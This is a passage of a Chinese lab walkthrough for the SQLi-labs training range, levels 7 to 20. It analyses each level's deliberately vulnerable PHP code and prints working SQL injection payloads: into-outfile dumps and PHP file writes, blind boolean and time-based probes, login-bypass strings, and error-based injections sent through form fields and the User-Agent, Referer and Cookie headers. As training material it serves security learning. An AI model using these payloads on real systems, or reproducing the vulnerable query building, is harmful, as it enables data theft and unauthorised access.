title="Less-7"></a>Less-7</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>id=((&#39;$id&#39;))</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre><code class="hljs Php"><span class="hljs-comment"># 使用单引号加双层括号拼接</span><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=((&#x27;<span class="hljs-subst">$id</span>&#x27;)) LIMIT 0,1&quot;</span>;<span class="hljs-comment"># 支持布尔盲注、延时盲注</span><span class="hljs-keyword">if</span> <span class="hljs-literal">true</span>:    输出 You are in.... <span class="hljs-keyword">Use</span> <span class="hljs-title">outfile</span>......<span class="hljs-title">else</span>:    输出 <span class="hljs-title">You</span> <span class="hljs-title">have</span> <span class="hljs-title">an</span> <span class="hljs-title">error</span> <span class="hljs-title">in</span> <span class="hljs-title">your</span> <span class="hljs-title">SQL</span> <span class="hljs-title">syntax</span>  //<span class="hljs-title">print_r</span>(<span class="hljs-title">mysql_error</span>());</code></pre><p>因为这里把<code>print_r(mysql_error());</code>给注释掉了，所以就不可以使用报错注入了，这个时候只能使用布尔盲注和延时盲注，可以尝试手工验证一下然后放到 sqlmap 里面来跑。</p><p>因为这一关作者很明显地提示了如下信息：</p><pre><code class="hljs lasso">You are <span class="hljs-keyword">in</span><span class="hljs-params">...</span>. Use outfile<span class="hljs-params">...</span><span class="hljs-params">...</span></code></pre><p>所以我们就来配合一下作者，使用 outfile 导出到文件来查询数据，默认 outfile 是没有开启的，得手动开启一下</p><pre><code class="hljs Bash">mysql&gt; show global variables like <span class="hljs-string">&#x27;%secure%&#x27;</span>;+--------------------------+-------+| Variable_name            | Value |+--------------------------+-------+| require_secure_transport | OFF   || secure_file_priv         | NULL  |+--------------------------+-------+2 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span>, 1 warning (0.02 sec)</code></pre><ul><li>secure_file_priv的值为 <code>null</code> ，表示限制 mysqld 不允许导入|导出</li><li>当secure_file_priv 的值为 <code>/tmp/</code> ，表示限制 mysqld 的导入|导出只能发生在/tmp/目录下</li><li>当secure_file_priv 的值为 <code>空</code> 时，表示不对 mysqld 的导入|导出做限制</li></ul><p><code>在mysql.ini里添加&quot;secure_file_priv=&#39;&#39;，保存，重启mysql</code></p><p>一般我们将这个信息导出到网站的根目录下，所以需要知道网站的物理路径信息，因为这里是靶机，所有这里就直接导出到网站根目录下看看：</p><pre><code class="hljs sql">?id=1&#x27;)) union <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> security.users <span class="hljs-keyword">into</span> <span class="hljs-keyword">outfile</span> <span class="hljs-string">&quot;D:/phpstudy_pro/WWW/sqli.pl/Less-7/users.txt&quot;</span><span class="hljs-comment">--+ </span></code></pre><p>users.txt内容</p><pre><code class="hljs apache"><span class="hljs-attribute">1</span>DumbDumb<span class="hljs-attribute">2</span>AngelinaI-kill-you<span class="hljs-attribute">3</span>Dummyp@ssword<span class="hljs-attribute">4</span>securecrappy<span class="hljs-attribute">5</span>stupidstupidity<span class="hljs-attribute">6</span>supermangenious<span class="hljs-attribute">7</span>batmanmob!le<span class="hljs-attribute">8</span>adminadmin<span class="hljs-attribute">9</span>admin<span class="hljs-number">1</span>admin<span class="hljs-number">1</span><span class="hljs-attribute">10</span>admin<span class="hljs-number">2</span>admin<span class="hljs-number">2</span><span class="hljs-attribute">11</span>admin<span class="hljs-number">3</span>admin<span class="hljs-number">3</span><span class="hljs-attribute">12</span>dhakkandumbo<span class="hljs-attribute">14</span>admin<span class="hljs-number">4</span>admin<span class="hljs-number">4</span></code></pre><p>一般情况看下可以往 Web 目录写文件的时候，直接写 shell 效率会更高：</p><pre><code class="hljs Sql">?id=1&#x27;)) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">outfile</span> <span class="hljs-string">&quot;D:/phpstudy_pro/WWW/sqli.pl/Less-7/info.php&quot;</span><span class="hljs-comment">--+ </span></code></pre><p>访问对应的 URL 看看是否解析了呢：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200720_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%9F%BA%E7%A1%80%E6%8C%91%E6%88%981-20%E5%85%B3/01.png" alt="img"></p><h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>和 Less-7 注入方式一致，只是拼接方式不一样</p><pre><code class="hljs mysql">?id&#x3D;1&#39; and left(database(),1)&gt;&#39;r&#39;--+?id&#x3D;1&#39; and left(database(),1)&gt;&#39;s&#39;--+?id&#x3D;1&#39; and left(database(),2)&gt;&#39;sd&#39;--+?id&#x3D;1&#39; and left(database(),2)&gt;&#39;se&#39;--+...</code></pre><h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>和 Less-7 注入方式一致，只是拼接方式不一样</p><p><strong>源码简单分析</strong>：</p><pre><code class="hljs Php"><span class="hljs-comment"># 使用单引号拼接</span><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-comment"># 支持延时盲注</span><span class="hljs-keyword">if</span> <span class="hljs-literal">true</span>:    输出 You are in............<span class="hljs-keyword">else</span>:    输出 You are in...........</code></pre><p>从源码中可以看到 if else 都输出的是 You are in……….. 这样就不能通过布尔盲注来进行注入了，只能用最慢的延时注入.</p><pre><code class="hljs mysql">?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))--+?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+?id&#x3D;1&#39; and if(ascii(substr(database(),2,1))&gt;100,1,sleep(5))--+?id&#x3D;1&#39; and if(ascii(substr(database(),2,1))&gt;101,1,sleep(5))--+...</code></pre><h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>延时盲注</td><td><code>id=&quot;$id&quot;</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre><code class="hljs Php"><span class="hljs-comment"># 先使用双引号再直接拼接</span><span class="hljs-variable">$id</span> = <span class="hljs-string">&#x27;&quot;&#x27;</span>.<span class="hljs-variable">$id</span>.<span class="hljs-string">&#x27;&quot;&#x27;</span>;<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=<span class="hljs-subst">$id</span> LIMIT 0,1&quot;</span>;<span class="hljs-comment"># 支持延时盲注</span><span class="hljs-keyword">if</span> <span class="hljs-literal">true</span>:    输出 You are in............<span class="hljs-keyword">else</span>:    输出 You are in...........</code></pre><p>和 Less-9 利用方式一样，只是拼接方式不一样，具体可以参考 Less-9</p><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=&#39;x&#39;</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre><code class="hljs Php"><span class="hljs-comment"># POST 方式接受变量</span><span class="hljs-variable">$uname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uname&#x27;</span>];<span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<span class="hljs-comment"># 使用单引号拼接 SQL</span>@<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="hljs-subst">$uname</span>&#x27; and password=&#x27;<span class="hljs-subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-keyword">if</span> <span class="hljs-literal">true</span>:    输出查询的信息<span class="hljs-keyword">else</span>:    print_r(mysql_error());</code></pre><p>和 Less-1 的利用方式相同，只是由 GET 型变成 POST 型。</p><h3 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h3><p>这里拿 admin 用户来模拟登录测试，首先查询出 admin 的用户信息如下：</p><pre><code class="hljs mysql">mysql&gt; select * from users where username &#x3D; &#39;admin&#39;;+----+----------+----------+| id | username | password |+----+----------+----------+|  8 | admin    | admin    |+----+----------+----------+</code></pre><p>因为核心的 SQL 语句只使用单引号拼接，这里就是一个经典的万能密码漏洞，可以使用如下 Payload 来登录系统：</p><pre><code class="hljs Bash"><span class="hljs-comment"># 注释掉 passwd 来登录</span>uname=admin<span class="hljs-string">&#x27; or 1=1#&amp;passwd=&amp;submit=Submit</span><span class="hljs-string">uname=admin&#x27;</span><span class="hljs-comment">#&amp;passwd=&amp;submit=Submit</span><span class="hljs-comment"># 注释后面语句 并 添加一个永真条件</span>uname=admin&amp;passwd=1<span class="hljs-string">&#x27; or 1#&amp;submit=Submit</span><span class="hljs-string">uname=admin&amp;passwd=1&#x27;</span>||1<span class="hljs-comment">#&amp;submit=Submit</span>uname=admin&amp;passwd=1<span class="hljs-string">&#x27; or 1#&amp;submit=Submit</span><span class="hljs-string">uname=admin&amp;passwd=1&#x27;</span>||1<span class="hljs-comment">#&amp;submit=Submit</span><span class="hljs-comment"># 闭合后面语句 并 添加一个永真条件</span>uname=admin&amp;passwd=1<span class="hljs-string">&#x27;or&#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1&amp;submit=Submituname=admin&amp;passwd=1<span class="hljs-string">&#x27;||&#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1&amp;submit=Submit</code></pre><blockquote><p>POST 数据里面不能有 <code>+</code>，这里得手动转换为空格</p></blockquote><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=(&quot;x&quot;)</code></td></tr></tbody></table><p>和 Less-11 的利用方式一样，只是 SQL 拼接方式不同，这里就不再啰嗦了。</p><h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>报错、布尔盲注、延时盲注</td><td><code>username=(&#39;x&#39;)</code></td></tr></tbody></table><p><strong>简单源码分析</strong></p><pre><code class="hljs Php"><span class="hljs-comment"># POST 方式接受变量</span><span class="hljs-variable">$uname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uname&#x27;</span>];<span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<span class="hljs-comment"># 使用单引号和括号来拼接 SQL</span>@<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT username, password FROM users WHERE username=(&#x27;<span class="hljs-subst">$uname</span>&#x27;) and password=(&#x27;<span class="hljs-subst">$passwd</span>&#x27;) LIMIT 0,1&quot;</span>;<span class="hljs-keyword">if</span> <span class="hljs-literal">true</span>:    并没有输出啥信息<span class="hljs-keyword">else</span>:    print_r(mysql_error());</code></pre><p>因为没有输出查询后的信息的原因，所以相对于 Less-11 和 Less-12 来说就少了 联合查询的注入方式，其他还是换汤不换药，这里就不再赘述了。</p><h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>报错、布尔盲注、延时盲注</td><td><code>username=&quot;x&quot;</code></td></tr></tbody></table><p><strong>简单源码分析</strong></p><pre><code class="hljs Php"><span class="hljs-comment"># 先使用 双引号 再直接带入 SQL 语句</span><span class="hljs-variable">$uname</span>=<span class="hljs-string">&#x27;&quot;&#x27;</span>.<span class="hljs-variable">$uname</span>.<span class="hljs-string">&#x27;&quot;&#x27;</span>;<span class="hljs-variable">$passwd</span>=<span class="hljs-string">&#x27;&quot;&#x27;</span>.<span class="hljs-variable">$passwd</span>.<span class="hljs-string">&#x27;&quot;&#x27;</span>; @<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT username, password FROM users WHERE username=<span class="hljs-subst">$uname</span> and password=<span class="hljs-subst">$passwd</span> LIMIT 0,1&quot;</span>;</code></pre><p>和 Less-13 异曲同工，只是拼接方式不一样，我们换对应的闭合方式即可进行注入。</p><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>布尔盲注、延时盲注</td><td><code>username=&#39;x&#39;</code></td></tr></tbody></table><p>源码中注释掉了 MySQL 的报错日志，所以这里就不可以进行报错注入了，只能使用布尔盲注或者延时盲注。</p><p>这里不再做重复无意义的记录了。</p><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>布尔盲注、延时盲注</td><td><code>username=(&quot;x&quot;)</code></td></tr></tbody></table><p>和 Less-15 注入类型一致，更换对应的闭合方式即可。</p><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>报错、布尔盲注、延时盲注</td><td><code>password = &#39;$passwd&#39;</code></td></tr></tbody></table><p><strong>简单源码分析</strong>:</p><pre><code class="hljs Php"><span class="hljs-comment"># uname 参数被过滤了</span><span class="hljs-variable">$uname</span>=check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]);  <span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<span class="hljs-comment"># SELECT 语句只获取了 uname 参数 但是被过滤了 没戏</span>@<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT username, password FROM users WHERE username= <span class="hljs-subst">$uname</span> LIMIT 0,1&quot;</span>;<span class="hljs-keyword">if</span> select 结果正确:    <span class="hljs-comment"># 更新语句 使用单引号拼接 passwd</span>    <span class="hljs-variable">$update</span>=<span class="hljs-string">&quot;UPDATE users SET password = &#x27;<span class="hljs-subst">$passwd</span>&#x27; WHERE username=&#x27;<span class="hljs-subst">$row1</span>&#x27;&quot;</span>;    <span class="hljs-keyword">if</span> mysql 报错:            print_r(mysql_error());</code></pre><p>从源码中可以分享唯一的注入点是在 update 语句里面，只使用了单引号拼接。因为操作正确并没有啥提示，所以不能使用联合查询注入，因为输出了报错日志，所以还可以进行报错注入，那么下面就演示一下报错注入吧：</p><pre><code class="hljs Bash">uname=admin&amp;passwd=1<span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)#&amp;submit=Submit</span></code></pre><h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>报错、布尔盲注、延时盲注</td><td><code>VALUES (&#39;$uagent&#39;)</code></td></tr></tbody></table><p><strong>简单源码分析</strong>:</p><pre><code class="hljs Php"><span class="hljs-comment"># 获取请求的 uagent 和 ip 地址</span><span class="hljs-variable">$uagent</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>];<span class="hljs-variable">$IP</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];<span class="hljs-keyword">if</span> 输入了uname 和 passwd:    <span class="hljs-comment"># 对这两个参数进行过滤</span>    <span class="hljs-variable">$uname</span> = check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]);    <span class="hljs-variable">$passwd</span> = check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>]);    <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="hljs-subst">$uname</span> and users.password=<span class="hljs-subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;    <span class="hljs-keyword">if</span> SQL语句有返回结果:        <span class="hljs-comment"># 执行 insert 语句 这里 uagent 和 ip_address 通过单引号拼接 并且 没有过滤</span>        <span class="hljs-variable">$insert</span>=<span class="hljs-string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="hljs-subst">$uagent</span>&#x27;, &#x27;<span class="hljs-subst">$IP</span>&#x27;, <span class="hljs-subst">$uname</span>)&quot;</span>;            输出 <span class="hljs-variable">$uagent</span>;        print_r(mysql_error());    <span class="hljs-keyword">else</span>:        print_r(mysql_error());</code></pre><p>这个代码漏洞点出在了 insert 语句，这里没有对 uagent 和 ip_address 进行过滤，并且输出了 mysql 的报错信息，所以本关支持 报错注入、布尔盲注和延时盲注。</p><p><strong>PHP 里用来获取客户端 IP 的变量</strong></p><ul><li><code>$_SERVER[&#39;HTTP_CLIENT_IP&#39;]</code> 这个很少使用，不一定服务器都实现了。客户端可以伪造。</li><li><code>$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]</code>，客户端可以伪造。</li><li><code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code>，客户端不能伪造。</li></ul><p>所以这里的 IP 是无法被伪造的，这里只能通过修改 user-agent 来进行注入，考虑到 insert 语句的特殊性，这里使用闭合方式来闭合掉后面的语句，因为输出了 mysql 报错日志了，这里尝试报错注入效率会更高一点：</p><p>首先这里要输入正确的账号和密码才能绕过账号密码判断，才能进入处理uagent部分</p><pre><code class="hljs Http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Less-18/</span> HTTP/1.1<span class="hljs-attribute">Host</span>: sqli.pl<span class="hljs-attribute">User-Agent</span>: 1&#x27; and updatexml(1,concat(0x7e,(select username from users limit 1,1),0x7e),1) and &#x27;1&#x27;=&#x27;1<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<span class="hljs-attribute">Referer</span>: http://sqli.pl/Less-18/<span class="hljs-attribute">DNT</span>: 1<span class="hljs-attribute">X-Forwarded-For</span>: 8.8.8.8<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded<span class="hljs-attribute">Content-Length</span>: 34uname=admin&amp;passwd=0&amp;submit=Submit</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200720_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%9F%BA%E7%A1%80%E6%8C%91%E6%88%981-20%E5%85%B3/02.png" alt="img"></p><h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>报错、布尔盲注、延时盲注</td><td><code>VALUES (&#39;$uagent&#39;)</code></td></tr></tbody></table><p><strong>简单源码分析</strong>:</p><pre><code class="hljs Php"><span class="hljs-comment"># 获取请求的 referer 和 ip 地址</span><span class="hljs-variable">$uagent</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>];<span class="hljs-variable">$IP</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];<span class="hljs-keyword">if</span> 输入了uname 和 passwd:    <span class="hljs-comment"># uname 和 passwd 参数均被过滤</span>    <span class="hljs-variable">$uname</span> = check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]);    <span class="hljs-variable">$passwd</span> = check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>]);    <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="hljs-subst">$uname</span> and users.password=<span class="hljs-subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;    <span class="hljs-keyword">if</span> SQL语句有返回结果:        <span class="hljs-comment"># 单引号拼接后直接带入 insert 语句</span>        <span class="hljs-variable">$insert</span>=<span class="hljs-string">&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;<span class="hljs-subst">$uagent</span>&#x27;, &#x27;<span class="hljs-subst">$IP</span>&#x27;)&quot;</span>;        输出 <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>]        print_r(mysql_error());        <span class="hljs-keyword">else</span>:        print_r(mysql_error());</code></pre><p>本关和 Less-18 异曲同工，只是这里的漏洞点出在了 referer 里面，其他利用方式基本上也是一毛一样，所以下面直接上 payload 演示吧：</p><pre><code class="hljs Http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Less-19/</span> HTTP/1.1<span class="hljs-attribute">Host</span>: sqli.pl<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<span class="hljs-attribute">Referer</span>: 1&#x27; and updatexml(1,concat(0x7e,(select username from users limit 1,1),0x7e),1) and &#x27;1&#x27;=&#x27;1<span class="hljs-attribute">DNT</span>: 1<span class="hljs-attribute">X-Forwarded-For</span>: 8.8.8.8<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded<span class="hljs-attribute">Content-Length</span>: 34uname=admin&amp;passwd=0&amp;submit=Submit</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200720_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%9F%BA%E7%A1%80%E6%8C%91%E6%88%981-20%E5%85%B3/03.png" alt="img"></p><h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=&#39;$cookee&#39;</code></td></tr></tbody></table><p><strong>简单源码分析</strong>:</p><pre><code class="hljs Php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> cookie 中不存在 uname 参数:      输出了一堆无用的信息    <span class="hljs-keyword">if</span> 提交了 uname 和 passwd:        <span class="hljs-comment"># 进行过滤</span>        <span class="hljs-variable">$uname</span> = check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]);        <span class="hljs-variable">$passwd</span> = check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>]);        <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="hljs-subst">$uname</span> and users.password=<span class="hljs-subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;        <span class="hljs-variable">$cookee</span> = <span class="hljs-variable">$row1</span>[<span class="hljs-string">&#x27;username&#x27;</span>];        <span class="hljs-keyword">if</span> 有查询结果:            <span class="hljs-comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span>            setcookie(<span class="hljs-string">&#x27;uname&#x27;</span>, <span class="hljs-variable">$cookee</span>, time()+<span class="hljs-number">3600</span>);        <span class="hljs-keyword">else</span>:            print_r(mysql_error());<span class="hljs-keyword">else</span>:    <span class="hljs-keyword">if</span> POST 数据里面没有 submit 参数:        <span class="hljs-variable">$cookee</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;uname&#x27;</span>];        <span class="hljs-comment"># 直接将 cookee 通过单引号拼接到 SQL 语句中</span>        <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;        <span class="hljs-keyword">if</span> 查询无结果:            输出 mysql_error()        <span class="hljs-keyword">if</span> 有结果:            输出查询的信息    <span class="hljs-keyword">else</span>:        <span class="hljs-comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span>        setcookie(<span class="hljs-string">&#x27;uname&#x27;</span>, <span class="hljs-variable">$row1</span>[<span class="hljs-string">&#x27;username&#x27;</span>], time()<span class="hljs-number">-3600</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>从源码中可以分析出 Less-20 要复杂一点，不过问题还是存在，从 cookie 中读取的 uname 参数值 并直接拼接到了 SQL 语句中了，这就导致了注入点的产生，并且还输出了查询信息，所以这里也是可以进行联合查询注入的。因为是基础关卡的最后一关</p><h3 id="联合查询注入-2"><a href="#联合查询注入-2" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /Less-<span class="hljs-number">20</span>/ HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: sqli.pl<span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; WOW<span class="hljs-number">64</span>; rv:<span class="hljs-number">49</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">49</span>.<span class="hljs-number">0</span><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<span class="hljs-attribute">Cookie</span>: uname=-admin&#x27; union select (select group_concat(username,&#x27;:&#x27;,password+SEPARATOR+<span class="hljs-number">0</span>x<span class="hljs-number">3</span>c<span class="hljs-number">62723</span>e) from users),<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#<span class="hljs-attribute">DNT</span>: <span class="hljs-number">1</span><span class="hljs-attribute">X</span>-Forwarded-For: <span class="hljs-number">8.8.8.8</span><span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200720_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%9F%BA%E7%A1%80%E6%8C%91%E6%88%981-20%E5%85%B3/04.png" alt="img"></p><h3 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h3><pre><code class="hljs Http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-20/</span> HTTP/1.1<span class="hljs-attribute">Host</span>: sqli.pl<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<span class="hljs-attribute">Cookie</span>: uname=admin&#x27; and updatexml(1,concat(0x7e,(select username from users limit 1,1),0x7e),1)#<span class="hljs-attribute">DNT</span>: 1<span class="hljs-attribute">X-Forwarded-For</span>: 8.8.8.8<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1</code></pre><p><img 